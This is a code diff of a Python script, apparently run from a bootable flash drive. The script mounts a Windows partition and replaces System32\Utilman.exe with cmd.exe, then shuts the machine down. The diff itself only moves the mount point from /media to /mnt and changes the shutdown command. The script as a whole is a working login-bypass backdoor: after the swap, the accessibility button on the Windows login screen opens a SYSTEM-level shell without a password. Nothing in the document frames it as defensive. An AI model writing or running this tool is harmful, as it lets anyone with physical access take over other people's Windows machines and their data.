@@ -4,7 +4,7 @@ import sys
 import os
 
 os.system('lsblk > result.txt')
-os.system('mkdir /media/Windows')
+os.system('mkdir /mnt/Windows')
 
 
 def parse(file_name):
@@ -20,10 +20,10 @@ def parse(file_name):
 
 def look_for_windows(list):
     for drive in drives_list:
-        os.system('mount /dev/%s /media/Windows' % (drive))
+        os.system('mount /dev/%s /mnt/Windows' % (drive))
         print('Checking for Windows on '+drive+'...\n')
-        if os.path.isdir('/media/Windows/Windows'):
-            print('Found Windows in '+drive+' and mounted it at /media/Windows')
+        if os.path.isdir('/mnt/Windows/Windows'):
+            print('Found Windows in '+drive+' and mounted it at /mnt/Windows')
             return drive
     return False
 
@@ -31,11 +31,11 @@ def look_for_windows(list):
 drives_list = parse("result.txt")
 if look_for_windows(drives_list):
     os.system(
-        'mv /media/Windows/Windows/System32/Utilman.exe /media/Windows/Windows/System32/Utilman.bak')
+        'mv /mnt/Windows/Windows/System32/Utilman.exe /mnt/Windows/Windows/System32/Utilman.bak')
     os.system(
-        'mv /media/Windows/Windows/System32/cmd.exe /media/Windows/Windows/System32/Utilman.exe')
+        'mv /mnt/Windows/Windows/System32/cmd.exe /mnt/Windows/Windows/System32/Utilman.exe')
     print('cmd.exe modified. Rebooting now')
 else:
     print('no windows found on this machine, don\'t forget to take out the flash drive')
 
-os.system('shutdown')
+os.system('shutdown now')
